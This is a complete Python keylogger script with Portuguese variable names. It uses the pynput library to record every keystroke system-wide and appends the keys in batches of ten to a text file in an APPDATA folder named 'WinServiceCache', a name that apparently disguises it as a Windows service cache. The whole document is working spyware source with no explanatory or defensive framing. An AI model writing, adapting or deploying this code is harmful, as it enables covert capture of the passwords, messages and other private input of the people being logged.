import os
from pathlib import Path
from pynput import keyboard

caminho_cache = Path(os.getenv('APPDATA')) / "WinServiceCache"
caminho_cache.mkdir(parents=True, exist_ok=True)
ARQUIVO_TXT = caminho_cache / "text.txt"
buffer_texto = []
LIMITE_BUFFER = 10

def salvar_no_arquivo(conteudo):
    with open(ARQUIVO_TXT, "a", encoding="utf-8") as f:
        f.write(conteudo)

def formatar_tecla(key):
    try:
        return key.char
    except AttributeError:
        mapeamento = {'space': ' ', 'enter': '\n', 'tab': '\t'}
        return mapeamento.get(key.name, f"[{key.name.upper()}]")

def on_press(key):
    tecla = formatar_tecla(key)
    buffer_texto.append(tecla)
    
    if len(buffer_texto) >= LIMITE_BUFFER:
        conteudo = "".join(buffer_texto)
        salvar_no_arquivo(conteudo)
        buffer_texto.clear()

with keyboard.Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        if buffer_texto:
            salvar_no_arquivo("".join(buffer_texto))